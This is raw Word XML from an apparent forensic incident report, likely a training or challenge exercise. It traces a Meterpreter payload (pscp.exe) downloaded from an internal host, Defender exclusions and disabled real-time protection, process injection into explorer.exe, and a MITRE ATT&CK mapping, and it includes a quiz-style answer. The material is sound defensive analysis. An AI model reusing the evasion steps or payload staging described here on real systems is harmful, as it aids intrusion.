            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>I-019</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="907"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>command</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2381"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>PowerShell HostName=MSFConsole HostApplication=explorer.exe HostId=26d014a9-f96a-4767-98ca-5ee12cac58b9</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2381"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Meterpreter PowerShell extension loaded inside injected explorer.exe 7324 at 11:06:40 UTC (Windows PowerShell 400/600/800, IEX of base64 Add-WebTransport/Invoke-DcSync bootstrap).</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1247"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 11:06:40.683825</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1247"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 11:06:40.900568</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#28055</w:t>
              <w:br/>
              <w:t>evtxecmd/evtxecmd_0.csv#28056</w:t>
              <w:br/>
              <w:t>evtxecmd/evtxecmd_0.csv#18660</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="680"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>I-020</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="907"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>file</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2381"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\Users\medmondson\AppData\Local\Microsoft\CLR_v4.0\UsageLogs\explorer.exe.log</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2381"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>CLR usage log written by injected explorer.exe 7324 at 11:16:03 UTC (abnormal for explorer.exe; artefact of .NET/PowerShell loading in the Meterpreter-injected process).</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1247"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 11:16:03.322916</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1247"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 11:16:03.322916</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#19241</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>6. MITRE ATT&amp;CK mapping</w:t>
      </w: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2268"/>
            <w:shd w:val="clear" w:color="auto" w:fill="1F3864"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>Technique</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="7370"/>
            <w:shd w:val="clear" w:color="auto" w:fill="1F3864"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>Findings / events</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2268"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>T1003.001</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="7370"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>F-005, T-004</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2268"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>T1016</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="7370"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>F-006, T-005, T-020</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2268"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>T1021.001</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="7370"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>F-013</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2268"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>T1021.002</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="7370"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>F-013</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2268"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>T1021.006</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="7370"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>F-013</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2268"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>T1033</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="7370"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>F-006, F-007, T-005, T-010, T-020</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2268"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>T1036.005</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="7370"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>F-003, F-005, F-008, F-014, F-016, T-003, T-018</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2268"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>T1041</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="7370"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>F-019</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2268"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>T1049</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="7370"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>F-007, T-010, T-020</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2268"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>T1053.005</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="7370"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>F-010</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2268"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>T1055</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="7370"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>F-005, F-008, T-003, T-004, T-018, T-019</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2268"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>T1057</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="7370"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>F-006, F-007, T-005, T-020</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2268"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>T1059.001</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="7370"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>F-005, F-006, F-008, T-006, T-009, T-019</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2268"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>T1059.003</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="7370"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>F-006, F-007</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2268"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>T1070.001</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="7370"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>F-018</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2268"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>T1070.004</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="7370"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>F-014, F-018</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2268"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>T1070.006</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="7370"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>F-018</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2268"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>T1071.001</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="7370"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>F-013, F-019</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2268"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>T1078.003</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="7370"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>F-012</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2268"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>T1087.001</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="7370"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>F-007, F-012, T-010, T-012, T-020</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2268"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>T1105</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="7370"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>F-003, F-006, F-009, F-014, F-016, F-019, T-001, T-007, T-008, T-013, T-015</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2268"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>T1204.002</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="7370"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>F-003, F-008, F-016, T-009, T-015</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2268"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>T1219</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="7370"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>F-013</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2268"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>T1543.003</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="7370"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>F-010</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2268"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>T1546.003</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="7370"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>F-010</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2268"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>T1546.015</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="7370"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>F-010</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2268"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>T1547.001</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="7370"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>F-010</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2268"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>T1548</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="7370"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>F-012</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2268"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>T1552.001</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="7370"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>F-015, T-014</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2268"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>T1562.001</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="7370"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>F-004, F-017, T-002, T-016</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2268"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>T1562.002</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="7370"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>F-018</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2268"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>T1564.012</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="7370"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>F-017</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>7. Answers to the questions</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Q1. What is the malicious executable?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br/>
              <w:t>evtx:microsoft-windows-windows defender%4operational.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>C:\Payloads\pscp.exe, a Meterpreter payload. Windows Defender detected it as Trojan:Win64/Meterpreter.E three times (Defender 1116/1117 at 10:16:43, 10:17:53 and 10:19:36 UTC) when Edge (browser_broker.exe) downloaded it from http://10.0.0.12:8080/pscp.exe. After the user excluded C:\Payloads\ in Defender and turned off real-time protection, the copy at C:\Payloads\pscp.exe ran on 2023-11-10 at 11:03:09 UTC. Its parent was the elevated PowerShell PID 1088 ({e6e9f951-0de1-654e-8801-000000000500}); the run is Sysmon EID 1, PID 2196, ProcessGuid {e6e9f951-0ded-654e-8f01-000000000500}. Independent sources corroborate the run: Prefetch PSCP.EXE-1DCA12FC.pf (RunCount 1, LastRun 11:03:09.900), SRUM, ShimCache and the PowerShell 4104/PSReadLine entry `.\pscp.exe`. The original Downloads copy is still in the Recycle Bin as $RHOVDEL.exe.</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r>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 10:16:44.708098</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webfile:_C:\Users\medmondson\Downloads\pscp.exe|http://10.0.0.12:8080/pscp.exe|pid:8820,ProcessStart:133440850044617643</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evtxecmd/evtxecmd_0.csv#23715</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\Windows\system32\winevt\logs\Microsoft-Windows-Windows Defender%4Operational.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 10:17:54.028923</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webfile:_C:\Users\medmondson\Downloads\pscp.exe|http://10.0.0.12:8080/pscp.exe|pid:8364,ProcessStart:133440850738826349</w:t>
              <w:br/>
              <w:t>Microsoft-Windows-Windows Defender/Operational 1116 | Microsoft-Windows-Windows Defender | Detection - The antimalware platform detected malware or other potentially unwanted software | Malware name: Trojan:Win64/Meterpreter.E | Description: Trojan (Severe) | Detection Time: 2023-11-10T10:17:53.875Z | Process (if real-time detection): C:\Windows\Sy</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#23722</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\Windows\system32\winevt\logs\Microsoft-Windows-Windows Defender%4Operational.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
